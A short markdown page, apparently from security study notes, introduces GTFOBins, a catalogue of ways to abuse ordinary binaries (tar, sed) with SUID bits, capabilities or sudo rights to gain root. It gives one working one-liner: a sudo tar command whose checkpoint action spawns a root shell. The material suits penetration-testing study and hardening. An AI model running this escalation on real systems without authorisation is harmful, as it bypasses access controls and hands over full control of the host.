# GTFOBins

<div class="row row-cols-md-2"><div>

**[GTFOBins](https://gtfobins.github.io/)** (8.3k ⭐) a.k.a. "Get The Fuck Out" is a list of way to exploit binaries such as `sed`/`tar`/... to get root.

Common use cases are:

* [Binary was given SUID/GUID permissions](perms.md#suidguid-bit)
* [Binary was given capabilities](perms.md#capabilities)
* [Binary was delegate sudo permission](sudo.md#administrative-privileges)
* ...

Note that not every exploit may pop a shell. Some only allow you to edit some files, which may help getting root.
</div><div>

**Example** 🔥

You can only run `tar` using `sudo`. Run the command below from [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo), and you will get a root shell.

```bash
$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
</div></div>